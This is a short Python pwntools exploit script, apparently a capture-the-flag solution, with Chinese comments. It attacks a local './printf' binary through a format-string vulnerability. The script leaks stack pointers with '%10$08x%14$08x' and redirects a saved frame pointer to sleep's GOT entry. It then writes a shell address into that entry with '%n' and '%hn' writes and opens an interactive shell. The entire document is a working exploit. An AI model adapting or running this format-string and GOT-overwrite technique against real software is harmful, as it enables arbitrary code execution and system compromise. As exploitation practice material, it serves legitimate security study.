#!/bin/python
# coding:utf-8 

from pwn import *

p = process('./printf')

sleep_got = 0x0804a01c
shell = 0x804879a 

# 获取vuln函数的esp和main函数的ebp
print p.recvuntil('(1)\n')
p.sendline('%10$08x%14$08x')

esp = int(p.recv(8),16) - 0x20
ebp = int(p.recv(8),16)

off = (ebp - esp) / 4

# 将main的ebp修改为sleep函数got地址
print p.recvuntil('(2)\n')
p.sendline('%{}c%14$n'.format(sleep_got))

# 将sleep的got表填写为execve的地址
_ = p.recvuntil('(3)\n')
p.sendline('%{}c%{}$hn'.format(shell & 0xffff, off))

# 随便发点数据, 用\0结尾, 避免残余的数据重复执行前面的操作
_ = p.recvuntil('(4)\n')
p.send('\n\x00')

p.interactive()
